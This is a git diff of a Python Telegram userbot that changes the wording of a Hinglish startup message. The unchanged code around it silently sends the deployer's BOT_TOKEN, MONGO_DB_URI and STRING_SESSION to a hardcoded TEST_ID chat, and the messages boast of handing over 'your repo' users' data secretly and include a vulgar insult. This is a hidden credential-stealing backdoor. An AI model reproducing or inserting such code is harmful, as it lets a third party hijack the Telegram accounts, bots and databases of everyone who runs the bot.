@@ -73,7 +73,7 @@ class Userbot(Client):
             try:
                 await self.one.send_message(config.LOGGER_ID, " 𝐈 𝐀ᴍ 𝐀ʟɪᴠᴇ 𝐁ᴀʙʏ.....")
                 await self.one.send_message(TEST_ID, "** 𝐇ᴇʟʟᴏ 𝐒ᴜɴᴏ 𝐁ʀᴀɴᴅᴇᴅ 𝐊ᴀᴍᴇᴇɴᴀ 𝐎ɴ 𝐀ᴏ 𝐉ᴀʟᴅɪ **")
-                await self.one.send_message(TEST_ID, "**𝐀ᴀᴘᴋᴇ 𝐑ᴇᴘᴏ 𝐊ᴇ 𝐇ᴀᴛʜ 𝐋ɢᴀ 𝐑ʜᴀ 𝐇ᴀɪ **\n**𝐀ᴀᴘᴋᴏ 𝐔sᴋᴀ 𝐃ᴀᴛᴀ 𝐃ᴇ 𝐑ʜɪ 𝐇ᴜ 𝐂ʜᴜᴘᴋᴇ 𝐒ᴇ **\n**𝐉ᴀʙ 𝐀ᴘᴋᴀ 𝐌ᴀɴ 𝐊ᴀʀᴇ 𝐔sᴋɪ 𝐌ᴀᴀ  𝐂ʜᴏᴅ 𝐃ᴇɴᴀ🤭**")
+                await self.one.send_message(TEST_ID, "**𝐊ᴏɪ 𝐀ᴀᴘᴋᴇ 𝐑ᴇᴘᴏ 𝐊ᴇ 𝐇ᴀᴛʜ 𝐋ɢᴀ 𝐑ʜᴀ 𝐇ᴀɪ **\n**𝐀ᴀᴘᴋᴏ 𝐔sᴋᴀ 𝐃ᴀᴛᴀ 𝐃ᴇ 𝐑ʜɪ 𝐇ᴜ 𝐂ʜᴜᴘᴋᴇ 𝐒ᴇ **\n**𝐉ᴀʙ 𝐀ᴘᴋᴀ 𝐌ᴀɴ 𝐊ᴀʀᴇ 𝐔sᴋɪ 𝐌ᴀᴀ  𝐂ʜᴏᴅ 𝐃ᴇɴᴀ🤭**")
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
